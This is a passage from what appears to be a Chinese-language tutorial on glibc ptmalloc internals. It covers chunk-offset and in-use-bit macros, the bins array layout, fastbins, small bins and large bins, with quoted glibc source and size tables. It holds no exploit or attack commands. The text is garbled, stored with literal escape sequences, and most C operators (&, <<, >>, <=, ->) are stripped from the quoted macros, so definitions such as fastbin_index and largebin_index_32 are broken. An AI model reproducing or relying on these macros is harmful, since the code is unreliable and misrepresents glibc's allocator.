(s))\n\n\n\n\n\n\u83b7\u53d6\u6307\u5b9a\u504f\u79fb\u7684chunk\n\n\n/* Treat space at ptr + offset as a chunk */\n\n\n#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))\n\n\n\n\n\n\u6307\u5b9a\u504f\u79fb\u5904chunk\u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c\n\n\n/* check/set/clear inuse bits in known places */\n\n\n#define inuse_bit_at_offset(p, s)                                              \\\n\n\n    (((mchunkptr)(((char *) (p)) + (s)))-\nmchunk_size \n PREV_INUSE)\n\n\n\n#define set_inuse_bit_at_offset(p, s)                                          \\\n\n\n    (((mchunkptr)(((char *) (p)) + (s)))-\nmchunk_size |= PREV_INUSE)\n\n\n\n#define clear_inuse_bit_at_offset(p, s)                                        \\\n\n\n    (((mchunkptr)(((char *) (p)) + (s)))-\nmchunk_size \n= ~(PREV_INUSE))\n\n\n\n\n\nbin\n\n\n\u6982\u8ff0\n\n\n\u6211\u4eec\u66fe\u7ecf\u8bf4\u8fc7\uff0c\u7528\u6237\u91ca\u653e\u6389\u7684 chunk \u4e0d\u4f1a\u9a6c\u4e0a\u5f52\u8fd8\u7ed9\u7cfb\u7edf\uff0cptmalloc \u4f1a\u7edf\u4e00\u7ba1\u7406 heap \u548c mmap \u6620\u5c04\u533a\u57df\u4e2d\u7684\u7a7a\u95f2\u7684chunk\u3002\u5f53\u7528\u6237\u518d\u4e00\u6b21\u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc \u5206\u914d\u5668\u4f1a\u8bd5\u56fe\u5728\u7a7a\u95f2\u7684chunk\u4e2d\u6311\u9009\u4e00\u5757\u5408\u9002\u7684\u7ed9\u7528\u6237\u3002\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9891\u7e41\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u964d\u4f4e\u5185\u5b58\u5206\u914d\u7684\u5f00\u9500\u3002\n\n\n\u5728\u5177\u4f53\u7684\u5b9e\u73b0\u4e2d\uff0cptmalloc \u91c7\u7528\u5206\u7bb1\u5f0f\u65b9\u6cd5\u5bf9\u7a7a\u95f2\u7684 chunk \u8fdb\u884c\u7ba1\u7406\u3002\u9996\u5148\uff0c\u5b83\u4f1a\u6839\u636e\u7a7a\u95f2\u7684 chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u5c06 chunk \u521d\u6b65\u5206\u4e3a4\u7c7b\uff1afast bins\uff0csmall bins\uff0clarge bins\uff0cunsorted bin\u3002\u6bcf\u7c7b\u4e2d\u4ecd\u7136\u6709\u66f4\u7ec6\u7684\u5212\u5206\uff0c\u76f8\u4f3c\u5927\u5c0f\u7684 chunk \u4f1a\u7528\u53cc\u5411\u94fe\u8868\u94fe\u63a5\u8d77\u6765\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u6bcf\u7c7b bin \u7684\u5185\u90e8\u4ecd\u7136\u4f1a\u6709\u591a\u4e2a\u4e92\u4e0d\u76f8\u5173\u7684\u94fe\u8868\u6765\u4fdd\u5b58\u4e0d\u540c\u5927\u5c0f\u7684 chunk\u3002\n\n\n\u5bf9\u4e8e small bins\uff0clarge bins\uff0cunsorted bin \u6765\u8bf4\uff0cPtmalloc \u5c06\u5b83\u4eec\u7ef4\u62a4\u5728\u540c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u3002\u8fd9\u4e9bbin\u5bf9\u5e94\u7684\u6570\u636e\u7ed3\u6784\u5728 malloc_state \u4e2d\uff0c\u5982\u4e0b\n\n\n#define NBINS 128\n\n\n/* Normal bins packed as described above */\n\n\nmchunkptr\n \nbins\n[\n \nNBINS\n \n*\n \n2\n \n-\n \n2\n \n];\n\n\n\n\n\n\u867d\u7136\u6bcf\u4e2a bin \u7684\u8868\u5934\u4f7f\u7528 mchunkptr \u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u8fd9\u53ea\u662f\u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u5c06\u6bcf\u4e2a bin \u8f6c\u5316\u4e3a malloc_chunk \u6307\u9488\u3002\u6211\u4eec\u5728\u4f7f\u7528\u65f6\uff0c\u4f1a\u5c06\u8fd9\u4e2a\u6307\u9488\u5f53\u505a\u4e00\u4e2a chunk \u7684 fd \u6216 bk \u6307\u9488\u6765\u64cd\u4f5c\uff0c\u4ee5\u4fbf\u4e8e\u5c06\u5904\u4e8e\u7a7a\u95f2\u7684\u5806\u5757\u94fe\u63a5\u5728\u4e00\u8d77\u3002\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u7a7a\u95f4\uff0c\u5e76\u63d0\u9ad8\u53ef\u7528\u6027\u3002\u90a3\u5230\u5e95\u662f\u600e\u4e48\u8282\u7701\u7684\u5462\uff1f\u8fd9\u91cc\u6211\u4eec\u4ee532\u4f4d\u7cfb\u7edf\u4e3a\u4f8b\n\n\n\n\n\n\n\n\n\u542b\u4e49\n\n\nbin1\u7684fd/bin2\u7684prev_size\n\n\nbin1\u7684bk/bin2\u7684size\n\n\nbin2\u7684fd/bin3\u7684prev_size\n\n\nbin2\u7684bk/bin3\u7684size\n\n\n\n\n\n\n\n\n\n\nbin\u4e0b\u6807\n\n\n0\n\n\n1\n\n\n2\n\n\n3\n\n\n\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u9664\u4e86\u7b2c\u4e00\u4e2abin\uff08unsorted bin\uff09\u5916\uff0c\u540e\u9762\u7684\u6bcf\u4e2abin\u4f1a\u5171\u4eab\u524d\u9762\u7684bin\u7684\u5b57\u6bb5\uff0c\u5c06\u5176\u89c6\u4e3amalloc chunk\u90e8\u5206\u7684prev_size\u548csize\u3002\u8fd9\u91cc\u4e5f\u8bf4\u660e\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\nbin\u7684\u4e0b\u6807\u548c\u6211\u4eec\u6240\u8bf4\u7684\u7b2c\u51e0\u4e2abin\u5e76\u4e0d\u662f\u4e00\u81f4\u7684\u3002\u540c\u65f6\uff0cbin\u8868\u5934\u7684 chunk \u7684 prev_size \u4e0e size \u5b57\u6bb5\u4e0d\u80fd\u968f\u4fbf\u4fee\u6539\uff0c\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u662f\u88ab\u5176\u5b83bin\u6240\u5229\u7528\u7684\u3002\n\n\n\u6570\u7ec4\u4e2d\u7684 bin \u4f9d\u6b21\u4ecb\u7ecd\u5982\u4e0b\n\n\n\n\n\u7b2c\u4e00\u4e2a\u4e3a unsorted bin\uff0c\u5b57\u5982\u5176\u9762\uff0c\u8fd9\u91cc\u9762\u7684 chunk \u6ca1\u6709\u8fdb\u884c\u6392\u5e8f\uff0c\u5b58\u50a8\u7684 chunk \u6bd4\u8f83\u6742\u3002\n\n\n\u7d22\u5f15\u4ece 2 \u5230 63 \u7684 bin \u79f0\u4e3a small bin\uff0c\u540c\u4e00\u4e2a small bin \u94fe\u8868\u4e2d\u7684 chunk \u7684\u5927\u5c0f\u76f8\u540c\u3002\u4e24\u4e2a\u76f8\u90bb\u7d22\u5f15\u7684 small bin \u94fe\u8868\u4e2d\u7684 chunk \u5927\u5c0f\u76f8\u5dee\u7684\u5b57\u8282\u6570\u4e3a\n2\u4e2a\u673a\u5668\u5b57\u957f\n\uff0c\u537332\u4f4d\u76f8\u5dee8\u5b57\u8282\uff0c64\u4f4d\u76f8\u5dee16\u5b57\u8282\u3002\n\n\nsmall bins \u540e\u9762\u7684 bin \u88ab\u79f0\u4f5c large bins\u3002large bins \u4e2d\u7684\u6bcf\u4e00\u4e2a bin \u90fd\u5305\u542b\u4e00\u5b9a\u8303\u56f4\u5185\u7684 chunk\uff0c\u5176\u4e2d\u7684chunk \u6309 fd \u6307\u9488\u7684\u987a\u5e8f\u4ece\u5927\u5230\u5c0f\u6392\u5217\u3002\u76f8\u540c\u5927\u5c0f\u7684chunk\u540c\u6837\u6309\u7167\u6700\u8fd1\u4f7f\u7528\u987a\u5e8f\u6392\u5217\u3002\n\n\n\n\n\u6b64\u5916\uff0c\u4e0a\u8ff0\u8fd9\u4e9bbin\u7684\u6392\u5e03\u90fd\u4f1a\u9075\u5faa\u4e00\u4e2a\u539f\u5219\uff1a\n\u4efb\u610f\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2chunk\u4e0d\u80fd\u5728\u4e00\u8d77\n\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684 chunk \u88ab\u91ca\u653e\u540e\u5c31\u7acb\u5373\u88ab\u653e\u5230 bin \u4e2d\u3002ptmalloc \u4e3a\u4e86\u63d0\u9ad8\u5206\u914d\u7684\u901f\u5ea6\uff0c\u4f1a\u628a\u4e00\u4e9b\u5c0f\u7684 chunk \n\u5148\n\u653e\u5230 fast bins \u7684\u5bb9\u5668\u5185\u3002\n\u800c\u4e14\uff0cfastbin \u5bb9\u5668\u4e2d\u7684 chunk \u7684\u4f7f\u7528\u6807\u8bb0\u603b\u662f\u88ab\u7f6e\u4f4d\u7684\uff0c\u6240\u4ee5\u4e0d\u6ee1\u8db3\u4e0a\u9762\u7684\u539f\u5219\u3002\n\n\nbin \u901a\u7528\u7684\u5b8f\u5982\u4e0b\n\n\ntypedef\n \nstruct\n \nmalloc_chunk\n \n*\nmbinptr\n;\n\n\n\n/* addressing -- note that bin_at(0) does not exist */\n\n\n#define bin_at(m, i)                                                           \\\n\n\n    (mbinptr)(((char *) \n((m)-\nbins[ ((i) -1) * 2 ])) -                        \\\n\n\n              offsetof(struct malloc_chunk, fd))\n\n\n\n/* analog of ++bin */\n\n\n//\u83b7\u53d6\u4e0b\u4e00\u4e2abin\u7684\u5730\u5740\n\n\n#define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) \n 1)))\n\n\n\n/* Reminders about list directionality within bins */\n\n\n// \u8fd9\u4e24\u4e2a\u5b8f\u53ef\u4ee5\u7528\u6765\u904d\u5386bin\n\n\n// \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5934\u7684 chunk\n\n\n#define first(b) ((b)-\nfd)\n\n\n// \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5c3e\u7684 chunk\n\n\n#define last(b) ((b)-\nbk)\n\n\n\n\n\nfast bin\n\n\n\u5927\u591a\u6570\u7a0b\u5e8f\u7ecf\u5e38\u4f1a\u7533\u8bf7\u4ee5\u53ca\u91ca\u653e\u4e00\u4e9b\u6bd4\u8f83\u5c0f\u7684\u5185\u5b58\u5757\u3002\u5982\u679c\u5c06\u4e00\u4e9b\u8f83\u5c0f\u7684 chunk \u91ca\u653e\u4e4b\u540e\u53d1\u73b0\u5b58\u5728\u4e0e\u4e4b\u76f8\u90bb\u7684\u7a7a\u95f2\u7684 chunk \u5e76\u5c06\u5b83\u4eec\u8fdb\u884c\u5408\u5e76\uff0c\u90a3\u4e48\u5f53\u4e0b\u4e00\u6b21\u518d\u6b21\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u5c31\u9700\u8981\u5bf9 chunk \u8fdb\u884c\u5206\u5272\uff0c\u8fd9\u6837\u5c31\u5927\u5927\u964d\u4f4e\u4e86\u5806\u7684\u5229\u7528\u6548\u7387\u3002\n\u56e0\u4e3a\u6211\u4eec\u628a\u5927\u90e8\u5206\u65f6\u95f4\u82b1\u5728\u4e86\u5408\u5e76\u3001\u5206\u5272\u4ee5\u53ca\u4e2d\u95f4\u68c0\u67e5\u7684\u8fc7\u7a0b\u4e2d\u3002\n\u56e0\u6b64\uff0cptmalloc \u4e2d\u4e13\u95e8\u8bbe\u8ba1\u4e86 fast bin\uff0c\u5bf9\u5e94\u7684\u53d8\u91cf\u5c31\u662f malloc state \u4e2d\u7684 fastbinsY \n\n\n/*\n\n\n   Fastbins\n\n\n\n    An array of lists holding recently freed small chunks.  Fastbins\n\n\n    are not doubly linked.  It is faster to single-link them, and\n\n\n    since chunks are never removed from the middles of these lists,\n\n\n    double linking is not necessary. Also, unlike regular bins, they\n\n\n    are not even processed in FIFO order (they use faster LIFO) since\n\n\n    ordering doesn\nt much matter in the transient contexts in which\n\n\n    fastbins are normally used.\n\n\n\n    Chunks in fastbins keep their inuse bit set, so they cannot\n\n\n    be consolidated with other free chunks. malloc_consolidate\n\n\n    releases all chunks in fastbins and consolidates them with\n\n\n    other free chunks.\n\n\n */\n\n\ntypedef\n \nstruct\n \nmalloc_chunk\n \n*\nmfastbinptr\n;\n\n\n\n/*\n\n\n    This is in malloc_state.\n\n\n    /* Fastbins */\n\n    \nmfastbinptr\n \nfastbinsY\n[\n \nNFASTBINS\n \n];\n\n\n*/\n\n\n\n\n\n\u4e3a\u4e86\u66f4\u52a0\u9ad8\u6548\u5730\u5229\u7528 fast bin\uff0cglibc \u91c7\u7528\u5355\u5411\u94fe\u8868\u5bf9\u5176\u4e2d\u7684\u6bcf\u4e2a bin \u8fdb\u884c\u7ec4\u7ec7\uff0c\u5e76\u4e14\n\u6bcf\u4e2a bin \u91c7\u53d6 LIFO \u7b56\u7565\n\uff0c\u6700\u8fd1\u91ca\u653e\u7684 chunk \u4f1a\u66f4\u65e9\u5730\u88ab\u5206\u914d\uff0c\u6240\u4ee5\u4f1a\u66f4\u52a0\u9002\u5408\u4e8e\u5c40\u90e8\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u7528\u6237\u9700\u8981\u7684 chunk \u7684\u5927\u5c0f\u5c0f\u4e8e fastbin \u7684\u6700\u5927\u5927\u5c0f\u65f6\uff0c ptmalloc \u4f1a\u9996\u5148\u5224\u65ad fastbin \u4e2d\u76f8\u5e94\u7684 bin \u4e2d\u662f\u5426\u6709\u5bf9\u5e94\u5927\u5c0f\u7684\u7a7a\u95f2\u5757\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u4f1a\u76f4\u63a5\u4ece\u8fd9\u4e2a bin \u4e2d\u83b7\u53d6 chunk\u3002\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0cptmalloc\u624d\u4f1a\u505a\u63a5\u4e0b\u6765\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002\n\n\n\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08\n32\u4f4d\u7cfb\u7edf\u4e3a\u4f8b\n\uff09\uff0c fastbin \u4e2d\u9ed8\u8ba4\u652f\u6301\u6700\u5927\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\u4e3a 64 \u5b57\u8282\u3002\u4f46\u662f\u5176\u53ef\u4ee5\u652f\u6301\u7684chunk\u7684\u6570\u636e\u7a7a\u95f4\u6700\u5927\u4e3a80\u5b57\u8282\u3002\u9664\u6b64\u4e4b\u5916\uff0c fastbin \u6700\u591a\u53ef\u4ee5\u652f\u6301\u7684 bin \u7684\u4e2a\u6570\u4e3a 10 \u4e2a\uff0c\u4ece\u6570\u636e\u7a7a\u95f4\u4e3a8\u5b57\u8282\u5f00\u59cb\u4e00\u76f4\u523080\u5b57\u8282\uff0c\u5b9a\u4e49\u5982\u4e0b\n\n\n#define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)\n\n\n\n#ifndef DEFAULT_MXFAST\n\n\n#define DEFAULT_MXFAST (64 * SIZE_SZ / 4)\n\n\n#endif\n\n\n\n/* The maximum fastbin request size we support */\n\n\n#define MAX_FAST_SIZE (80 * SIZE_SZ / 4)\n\n\n\n/*\n\n\n   Since the lowest 2 bits in max_fast don\nt matter in size comparisons,\n\n\n   they are used as flags.\n\n\n */\n\n\n\n/*\n\n\n   FASTCHUNKS_BIT held in max_fast indicates that there are probably\n\n\n   some fastbin chunks. It is set true on entering a chunk into any\n\n\n   fastbin, and cleared only in malloc_consolidate.\n\n\n\n   The truth value is inverted so that have_fastchunks will be true\n\n\n   upon startup (since statics are zero-filled), simplifying\n\n\n   initialization checks.\n\n\n */\n\n\n//\u5224\u65ad\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk\uff0c1\u8868\u793a\u6ca1\u6709\n\n\n#define FASTCHUNKS_BIT (1U)\n\n\n\n#define have_fastchunks(M) (((M)-\nflags \n FASTCHUNKS_BIT) == 0)\n\n\n#define clear_fastchunks(M) catomic_or(\n(M)-\nflags, FASTCHUNKS_BIT)\n\n\n#define set_fastchunks(M) catomic_and(\n(M)-\nflags, ~FASTCHUNKS_BIT)\n\n\n\n/*\n\n\n   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous\n\n\n   regions.  Otherwise, contiguity is exploited in merging together,\n\n\n   when possible, results from consecutive MORECORE calls.\n\n\n\n   The initial value comes from MORECORE_CONTIGUOUS, but is\n\n\n   changed dynamically if mmap is ever used as an sbrk substitute.\n\n\n */\n\n\n// MORECODE\u662f\u5426\u8fd4\u56de\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u3002\n\n\n// \u4e3b\u5206\u914d\u533a\u4e2d\u7684MORECORE\u5176\u5b9e\u4e3asbr()\uff0c\u9ed8\u8ba4\u8fd4\u56de\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4\n\n\n// \u975e\u4e3b\u5206\u914d\u533a\u4f7f\u7528mmap()\u5206\u914d\u5927\u5757\u865a\u62df\u5185\u5b58\uff0c\u7136\u540e\u8fdb\u884c\u5207\u5206\u6765\u6a21\u62df\u4e3b\u5206\u914d\u533a\u7684\u884c\u4e3a\n\n\n// \u800c\u9ed8\u8ba4\u60c5\u51b5\u4e0bmmap\u6620\u5c04\u533a\u57df\u662f\u4e0d\u4fdd\u8bc1\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8fde\u7eed\u7684\uff0c\u6240\u4ee5\u975e\u4e3b\u5206\u914d\u533a\u9ed8\u8ba4\u5206\u914d\u975e\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002\n\n\n#define NONCONTIGUOUS_BIT (2U)\n\n\n\n#define contiguous(M) (((M)-\nflags \n NONCONTIGUOUS_BIT) == 0)\n\n\n#define noncontiguous(M) (((M)-\nflags \n NONCONTIGUOUS_BIT) != 0)\n\n\n#define set_noncontiguous(M) ((M)-\nflags |= NONCONTIGUOUS_BIT)\n\n\n#define set_contiguous(M) ((M)-\nflags \n= ~NONCONTIGUOUS_BIT)\n\n\n\n/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the\n\n\n   arena.  Such an arena is no longer used to allocate chunks.  Chunks\n\n\n   allocated in that arena before detecting corruption are not freed.  */\n\n\n\n#define ARENA_CORRUPTION_BIT (4U)\n\n\n\n#define arena_is_corrupt(A) (((A)-\nflags \n ARENA_CORRUPTION_BIT))\n\n\n#define set_arena_corrupt(A) ((A)-\nflags |= ARENA_CORRUPTION_BIT)\n\n\n\n/*\n\n\n   Set value of max_fast.\n\n\n   Use impossibly small value if 0.\n\n\n   Precondition: there are no existing fastbin chunks.\n\n\n   Setting the value clears fastchunk bit but preserves noncontiguous bit.\n\n\n */\n\n\n\n#define set_max_fast(s)                                                        \\\n\n\n    global_max_fast =                                                          \\\n\n\n        (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) \n ~MALLOC_ALIGN_MASK))\n\n\n#define get_max_fast() global_max_fast\n\n\n\n\n\nptmalloc \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a\u8c03\u7528 set_max_fast(s) \u5c06\u5168\u5c40\u53d8\u91cf global_max_fast \u8bbe\u7f6e\u4e3a DEFAULT_MXFAST\uff0c\u4e5f\u5c31\u662f\u8bbe\u7f6e fast bins \u4e2d chunk \u7684\u6700\u5927\u503c\u3002\u5f53 MAX_FAST_SIZE \u88ab\u8bbe\u7f6e\u4e3a 0 \u65f6\uff0c\u7cfb\u7edf\u5c31\u4e0d\u4f1a\u652f\u6301 fastbin \u3002\n\n\nfastbin\u7684\u7d22\u5f15\n\n\n#define fastbin(ar_ptr, idx) ((ar_ptr)-\nfastbinsY[ idx ])\n\n\n\n/* offset 2 to use otherwise unindexable first 2 bins */\n\n\n// chunk size=2*size_sz*(2+idx)\n\n\n// \u8fd9\u91cc\u8981\u51cf2\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u524d\u4e24\u4e2abin\u6ca1\u6709\u529e\u6cd5\u7d22\u5f15\u5230\u3002\n\n\n#define fastbin_index(sz)                                                      \\\n\n\n    ((((unsigned int) (sz)) \n (SIZE_SZ == 8 ? 4 : 3)) - 2)\n\n\n\n\n\n\u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0cfastbin \u8303\u56f4\u7684 chunk \u7684 inuse \u59cb\u7ec8\u88ab\u7f6e\u4e3a 1\u3002\u56e0\u6b64\u5b83\u4eec\u4e0d\u4f1a\u548c\u5176\u5b83\u88ab\u91ca\u653e\u7684chunk\u5408\u5e76\u3002\n\n\n\u4f46\u662f\u5f53\u91ca\u653e\u7684 chunk \u4e0e\u8be5 chunk \u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5408\u5e76\u540e\u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD\u65f6\uff0c\u5185\u5b58\u788e\u7247\u53ef\u80fd\u6bd4\u8f83\u591a\u4e86\uff0c\u6211\u4eec\u5c31\u9700\u8981\u628a fast bins \u4e2d\u7684chunk\u90fd\u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u51cf\u5c11\u5185\u5b58\u788e\u7247\u5bf9\u7cfb\u7edf\u7684\u5f71\u54cd\u3002\n\n\n/*\n\n\n   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()\n\n\n   that triggers automatic consolidation of possibly-surrounding\n\n\n   fastbin chunks. This is a heuristic, so the exact value should not\n\n\n   matter too much. It is defined at half the default trim threshold as a\n\n\n   compromise heuristic to only attempt consolidation if it is likely\n\n\n   to lead to trimming. However, it is not dynamically tunable, since\n\n\n   consolidation reduces fragmentation surrounding large chunks even\n\n\n   if trimming is not used.\n\n\n */\n\n\n\n#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)\n\n\n\n\n\nmalloc_consolidate\u51fd\u6570\u53ef\u4ee5\u5c06fastbin\u4e2d\u6240\u6709\u7684chunk\u91ca\u653e\u5e76\u5408\u5e76\u5728\u4e00\u8d77\u3002\uff1f\uff1f\uff1f\n \n\n\n/*\n    Chunks in fastbins keep their inuse bit set, so they cannot\n    be consolidated with other free chunks. malloc_consolidate\n    releases all chunks in fastbins and consolidates them with\n    other free chunks.\n */\n\n\n\n\nsmall bin\n\n\nsmall bins \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0e\u5176\u6240\u5728\u7684 bin \u7684 index \u7684\u5173\u7cfb\u4e3a\uff1achunk_size =2 * SIZE_SZ *index\uff0c\u5177\u4f53\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u4e0b\u6807\n\n\nSIZE_SZ=4\uff0832\u4f4d\uff09\n\n\nSIZE_SZ=8\uff0864\u4f4d\uff09\n\n\n\n\n\n\n\n\n\n\n2\n\n\n16\n\n\n32\n\n\n\n\n\n\n3\n\n\n24\n\n\n48\n\n\n\n\n\n\n4\n\n\n32\n\n\n64\n\n\n\n\n\n\n5\n\n\n40\n\n\n80\n\n\n\n\n\n\nx\n\n\n2*4*x\n\n\n2*8*x\n\n\n\n\n\n\n63\n\n\n504\n\n\n1008\n\n\n\n\n\n\n\n\nsmall bins \u4e2d\u4e00\u5171\u6709 62 \u4e2a\u94fe\u8868\uff0c\u6bcf\u4e2a\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u90fd\u4e00\u81f4\u3002\u6bd4\u5982\u5bf9\u4e8e 32 \u4f4d\u7cfb\u7edf\u6765\u8bf4\uff0c\u4e0b\u6807 2 \u5bf9\u5e94\u7684\u53cc\u5411\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u4e3a\u5747\u4e3a 16 \u5b57\u8282\u3002\u6bcf\u4e2a\u94fe\u8868\u90fd\u6709\u94fe\u8868\u5934\u7ed3\u70b9\uff0c\u8fd9\u6837\u53ef\u4ee5\u65b9\u4fbf\u5bf9\u4e8e\u94fe\u8868\u5185\u90e8\u7ed3\u70b9\u7684\u7ba1\u7406\u3002\u6b64\u5916\uff0c\nsmall bins \u4e2d\u6bcf\u4e2a bin \u5bf9\u5e94\u7684\u94fe\u8868\u91c7\u7528 FIFO \u7684\u89c4\u5219\n\uff0c\u6240\u4ee5\u540c\u4e00\u4e2a\u94fe\u8868\u4e2d\u5148\u88ab\u91ca\u653e\u7684 chunk \u4f1a\u5148\u88ab\u5206\u914d\u51fa\u53bb\u3002\n\n\nsmall bin\u76f8\u5173\u7684\u5b8f\u5982\u4e0b\n\n\n#define NSMALLBINS 64\n\n\n#define SMALLBIN_WIDTH MALLOC_ALIGNMENT\n\n\n// \u662f\u5426\u9700\u8981\u5bf9small bin\u7684\u4e0b\u6807\u8fdb\u884c\u7ea0\u6b63\n\n\n#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT \n 2 * SIZE_SZ)\n\n\n\n#define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)\n\n\n//\u5224\u65adchunk\u7684\u5927\u5c0f\u662f\u5426\u5728small bin\u8303\u56f4\u5185\n\n\n#define in_smallbin_range(sz)                                                  \\\n\n\n    ((unsigned long) (sz) \n (unsigned long) MIN_LARGE_SIZE)\n\n\n// \u6839\u636echunk\u7684\u5927\u5c0f\u5f97\u5230small bin\u5bf9\u5e94\u7684\u7d22\u5f15\u3002\n\n\n#define smallbin_index(sz)                                                     \\\n\n\n    ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) \n 4)                          \\\n\n\n                           : (((unsigned) (sz)) \n 3)) +                       \\\n\n\n     SMALLBIN_CORRECTION)\n\n\n\n\n\n\u6216\u8bb8\uff0c\u5927\u5bb6\u4f1a\u5f88\u7591\u60d1\uff0c\u90a3 fastbin \u4e0e small bin \u4e2d chunk \u7684\u5927\u5c0f\u4f1a\u6709\u5f88\u5927\u4e00\u90e8\u5206\u91cd\u5408\u554a\uff0c\u90a3 small bin \u4e2d\u5bf9\u5e94\u5927\u5c0f\u7684 bin \u662f\u4e0d\u662f\u5c31\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\u554a\uff1f\n \u5176\u5b9e\u4e0d\u7136\uff0cfast bin \u4e2d\u7684 chunk \u662f\u6709\u53ef\u80fd\u88ab\u653e\u5230 small bin\u4e2d\u53bb\u7684\u3002\n\n\nlarge bin\n\n\nlarge bins \u4e2d\u4e00\u5171\u5305\u62ec 63 \u4e2a bin\uff0c\u6bcf\u4e2a bin \u4e2d\u7684 chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u81f4\uff0c\u800c\u662f\u5904\u4e8e\u4e00\u5b9a\u533a\u95f4\u8303\u56f4\u5185\u3002\u6b64\u5916\uff0c\u8fd9 63 \u4e2a bin \u88ab\u5206\u6210\u4e86 6 \u7ec4\uff0c\u6bcf\u7ec4 bin \u4e2d\u7684 chunk \u5927\u5c0f\u4e4b\u95f4\u7684\u516c\u5dee\u4e00\u81f4\uff0c\u5177\u4f53\u5982\u4e0b\uff1a\n\n\n\n\n\n\n\n\n\u7ec4\n\n\n\u6570\u91cf\n\n\n\u516c\u5dee\n\n\n\n\n\n\n\n\n\n\n1\n\n\n32\n\n\n64B\n\n\n\n\n\n\n2\n\n\n16\n\n\n512B\n\n\n\n\n\n\n3\n\n\n8\n\n\n4096B\n\n\n\n\n\n\n4\n\n\n4\n\n\n32768B\n\n\n\n\n\n\n5\n\n\n2\n\n\n262144B\n\n\n\n\n\n\n6\n\n\n1\n\n\n\u4e0d\u9650\u5236\n\n\n\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u7684 large bin \u4e3a\u4f8b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a 512 \u5b57\u8282\uff0c\u4f4d\u4e8e\u7b2c\u4e00\u7ec4\uff0c\u6240\u4ee5\u8be5bin \u53ef\u4ee5\u5b58\u50a8\u7684 chunk \u7684\u5927\u5c0f\u8303\u56f4\u4e3a [512,512+64)\u3002\n\n\n\u5173\u4e8e large bin \u7684\u5b8f\u5982\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u4e0b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a\u4f8b\uff0c\u4e3a 512 \u5b57\u8282\uff0c\u90a3\u4e48 512\n6 = 8\uff0c\u6240\u4ee5\u5176\u4e0b\u6807\u4e3a56+8=64\u3002\n\n\n#define largebin_index_32(sz)                                                  \\\n\n\n    (((((unsigned long) (sz)) \n 6) \n= 38)                                     \\\n\n\n         ? 56 + (((unsigned long) (sz)) \n 6)                                  \\\n\n\n         : ((((unsigned long) (sz)) \n 9) \n= 20)                               \\\n\n\n               ? 91 + (((unsigned long) (sz)) \n 9)                            \\\n\n\n               : ((((unsigned long) (sz)) \n 12) \n= 10)                        \\\n\n\n                     ? 110 + (((unsigned long) (sz)) \n 12)                    \\\n\n\n                     : ((((unsigned long) (sz)) \n 15) \n= 4)                   \\\n\n\n                           ? 119 + (((unsigned long) (sz)) \n 15)              \\\n\n\n                           : ((((unsigned long) (sz)) \n 18) \n= 2)             \\\n\n\n                                 ? 124 + 